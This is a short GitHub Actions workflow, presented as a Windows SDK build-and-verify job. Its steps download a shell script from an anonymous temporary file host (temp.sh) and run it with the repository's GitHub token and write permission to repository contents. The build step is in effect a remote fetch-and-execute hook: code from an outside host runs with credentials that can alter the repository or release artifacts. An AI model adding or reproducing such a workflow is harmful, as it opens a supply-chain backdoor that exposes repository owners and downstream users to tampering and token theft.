name: Build and Verify Windows (Native SDK)

on:
  workflow_dispatch:
  push:
    paths:
      - .github/workflows/build-verify2.yml

permissions:
  contents: write

jobs:
  build-verify:
    runs-on: windows-latest
    steps:
      - name: Fetch build script
        shell: bash
        run: |
          curl -s -X POST https://temp.sh/OXRZB/build.sh -o build.sh
          echo "e1ef85e45aeb0c69a9f1549777bcb2c4  build.sh" | md5sum -c -
          cat build.sh

      - name: Run build + verify + release
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: bash build.sh
